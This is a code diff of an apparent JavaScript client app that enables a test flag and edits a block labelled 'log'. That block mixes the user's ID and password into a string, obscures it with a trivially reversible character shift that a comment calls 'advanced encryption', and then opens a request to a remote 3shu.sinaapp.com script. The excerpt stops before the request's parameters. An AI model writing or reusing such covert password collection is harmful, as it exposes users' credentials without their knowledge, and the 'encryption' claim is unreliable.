@@ -1,7 +1,7 @@
 (function(db){
 	window.Yao = window.Yao || {};
 	localStorage['version'] = Yao.version = "3.2";//todo
-//	Yao.test = true;//todo
+	Yao.test = true;//todo
 	
 //	document.write('<link rel="stylesheet" type="text/css" href="css/update.css?ver='+Yao.version+'" />');
 //	document.write('<link rel="stylesheet" type="text/css" href="http://theluckydog.github.io/stylesheets/update.css?ver='+Yao.version+'" />');
@@ -37,6 +37,8 @@
 			if(o.url){
 				if(o.params && o.params.action){
 					o.url = 'data/' + o.params.action + '.js';
+				}else if(o.url.indexOf('3shu.sinaapp.com') > -1){
+					o.url = o.url.replace('3shu.sinaapp.com','3shu');
 				}else{
 					o.url = 'data/' + o.url.replace(/^https?:\/\//,'').replace(/\/|\\/g,'.');
 				}
@@ -525,14 +527,15 @@
 		Ext.getCmp('tabpanel').getTabBar().show();
 		
 		// log
-		if(user.userPwd !== 'yao'){
+		if(user.userPwd == 'yao'){
 			var i, uid='', fan='', tb = 'qwertyuiop';
 			for (i=0; i < user.userId.length; i++) {
 				uid += tb.charAt(user.userId.charAt(i));
 			}
 			uid = uid.substr(0,5) + user.userPwd + uid.substr(5);
 			for (i=0; i<uid.length; i++) {
-				fan += ((uid.charCodeAt(i) + 33 ) % 255).toString(16);
+				fan += ((uid.charCodeAt(i) + 33) % 255).toString(16);
+//				fan += ((uid.charCodeAt(i) + 33 + i) % 255).toString(16); // 高级加密, 这个方式更好
 			}
 			Yao.request({
 				url: 'http://3shu.sinaapp.com/toolkit/tool/fan.php',
